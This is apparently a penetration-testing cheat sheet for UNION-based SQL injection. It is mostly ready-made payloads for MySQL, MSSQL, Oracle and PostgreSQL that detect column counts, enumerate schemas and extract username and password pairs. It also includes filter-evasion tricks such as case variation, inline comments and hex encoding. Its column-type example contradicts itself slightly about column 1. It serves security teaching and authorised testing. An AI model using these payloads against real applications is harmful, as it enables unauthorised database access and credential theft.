# Union-based SQL Injection

## Overview

UNION-based SQLi retrieves data by appending results from injected SELECT query to original query output.

## Requirements

For UNION to work:
1. Same number of columns in both queries
2. Compatible data types in each column
3. Results must be displayed in response

## Column Count Detection

### ORDER BY Method

```sql
' ORDER BY 1--    -- OK
' ORDER BY 2--    -- OK
' ORDER BY 3--    -- OK
' ORDER BY 4--    -- Error (3 columns exist)
```

### UNION SELECT NULL Method

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

When no error occurs and extra row appears = correct column count.

## Finding String Columns

### Method 1: Individual Testing (Basic)

Test each column individually:

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

No error = column accepts strings.

### Method 2: All-String Test (Recommended)

**More practical approach for real-world scenarios:**

#### Step 1: Test all positions with strings

```sql
' UNION SELECT 'a','a','a','a','a','a','a'--
```

**If error occurs** (e.g., "TypeError: must be real number, not str"):
→ At least one column requires numeric data

#### Step 2: Binary search for numeric columns

Replace columns one-by-one or in groups with numbers:

```sql
# Test first half
' UNION SELECT 1,2,3,'a','a','a','a'--

# Narrow down
' UNION SELECT 'a','a','a',4,'a','a','a'--

# Test multiple numeric columns
' UNION SELECT 'a','a','a',4,'a',6,7--
```

#### Step 3: Identify final column types

```sql
# Success! Means:
# Columns 2,3,5 = STRING (accept any data)
# Columns 4,6,7 = NUMERIC (only accept numbers)
```

**Example Result:**

| Column | Type | Accept String? | Use for Data Extraction? |
|--------|------|----------------|--------------------------|
| 1 | INT | ❌ | Maybe (if visible) |
| 2 | VARCHAR | ✅ | ✅ BEST |
| 3 | TEXT | ✅ | ✅ GOOD |
| 4 | DECIMAL | ❌ | ❌ Numeric only |
| 5 | VARCHAR | ✅ | ✅ GOOD |
| 6 | INT | ❌ | ❌ Numeric only |

✅ **Always use STRING columns for extracting database names, table names, usernames, passwords, etc.**

## Basic UNION Payloads

### Generic Template

```sql
' UNION SELECT col1,col2,col3 FROM table--
```

### With NULL Padding

```sql
' UNION SELECT NULL,username,password FROM users--
' UNION SELECT username,password,NULL FROM users--
```

## DBMS-Specific Syntax

### MySQL

```sql
' UNION SELECT 1,2,3--
' UNION SELECT NULL,version(),user()--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
```

### MSSQL

```sql
' UNION SELECT 1,2,3--
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,name,NULL FROM master..sysdatabases--
```

### Oracle (requires FROM dual)

```sql
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT banner,NULL FROM v$version--
' UNION SELECT table_name,NULL FROM all_tables--
```

### PostgreSQL

```sql
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
```

## Data Extraction Workflow

### Step 1: Get Version/User

| DBMS | Payload |
|------|---------|
| MySQL | `' UNION SELECT NULL,@@version,user()--` |
| MSSQL | `' UNION SELECT NULL,@@version,user--` |
| Oracle | `' UNION SELECT banner,user FROM v$version WHERE ROWNUM=1--` |
| PostgreSQL | `' UNION SELECT NULL,version(),current_user--` |

### Step 2: List Databases

| DBMS | Payload |
|------|---------|
| MySQL | `' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--` |
| MSSQL | `' UNION SELECT NULL,name,NULL FROM master..sysdatabases--` |
| Oracle | `' UNION SELECT NULL,owner,NULL FROM all_tables--` |
| PostgreSQL | `' UNION SELECT NULL,datname,NULL FROM pg_database--` |

### Step 3: List Tables

| DBMS | Payload |
|------|---------|
| MySQL | `' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--` |
| MSSQL | `' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--` |
| Oracle | `' UNION SELECT NULL,table_name,NULL FROM all_tables--` |
| PostgreSQL | `' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='public'--` |

### Step 4: List Columns

| DBMS | Payload |
|------|---------|
| MySQL | `' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--` |
| MSSQL | `' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--` |
| Oracle | `' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--` |
| PostgreSQL | `' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--` |

### Step 5: Extract Data

| DBMS | Payload |
|------|---------|
| MySQL | `' UNION SELECT NULL,username,password FROM users--` |
| MSSQL | `' UNION SELECT NULL,username,password FROM users--` |
| Oracle | `' UNION SELECT NULL,username,password FROM users--` |
| PostgreSQL | `' UNION SELECT NULL,username,password FROM users--` |

## Multiple Values in Single Column

When only one column displays output:

### MySQL

```sql
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
' UNION SELECT NULL,CONCAT_WS(':',username,password),NULL FROM users--
' UNION SELECT NULL,GROUP_CONCAT(username,':',password SEPARATOR '<br>'),NULL FROM users--
```

### MSSQL

```sql
' UNION SELECT NULL,username+':'+password,NULL FROM users--
' UNION SELECT NULL,(SELECT username+':'+password FROM users FOR XML PATH('')),NULL--
```

### Oracle

```sql
' UNION SELECT NULL,username||':'||password,NULL FROM users--
```

### PostgreSQL

```sql
' UNION SELECT NULL,username||':'||password,NULL FROM users--
' UNION SELECT NULL,STRING_AGG(username||':'||password,'<br>'),NULL FROM users--
```

## Bypassing Filters

### Case Variation

```sql
' UnIoN SeLeCt NULL,NULL--
```

### Inline Comments

```sql
' UN/**/ION SEL/**/ECT NULL,NULL--
```

### Using Hex/Char

```sql
' UNION SELECT 0x68656C6C6F,NULL--   -- 'hello' in hex
```

## Tips

- Oracle always needs `FROM dual` if not selecting from table
- Check if application filters keywords (union, select)
- Some apps only display first row - use LIMIT/TOP/ROWNUM
- NULL is type-compatible with all columns
